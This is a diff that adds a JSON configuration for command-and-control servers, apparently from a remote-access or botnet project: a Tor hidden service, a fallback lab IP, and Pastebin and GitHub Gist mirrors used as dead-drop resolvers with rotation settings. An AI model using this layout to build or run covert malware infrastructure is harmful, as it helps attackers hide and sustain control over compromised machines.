@@ -1,0 +1,32 @@
+{
+  "version": "1.0",
+  "last_updated": "2025-11-08T00:00:00Z",
+  "c2_servers": [
+    {
+      "id": "primary",
+      "type": "tor_hidden",
+      "address": "YOUR_ONION_ADDRESS.onion",
+      "port": 8443,
+      "use_tor": true,
+      "priority": 1,
+      "status": "active",
+      "description": "PC Principal con Tor"
+    },
+    {
+      "id": "fallback_1",
+      "type": "direct_ip",
+      "address": "192.168.56.1",
+      "port": 8443,
+      "use_tor": false,
+      "priority": 2,
+      "status": "active",
+      "description": "IP directa local (backup)"
+    }
+  ],
+  "cdn_mirrors": [
+    "https://pastebin.com/raw/YOUR_PASTE_ID",
+    "https://gist.githubusercontent.com/YOUR_USER/YOUR_GIST/raw/c2_servers.json"
+  ],
+  "update_interval": 3600,
+  "fallback_behavior": "rotate"
+}
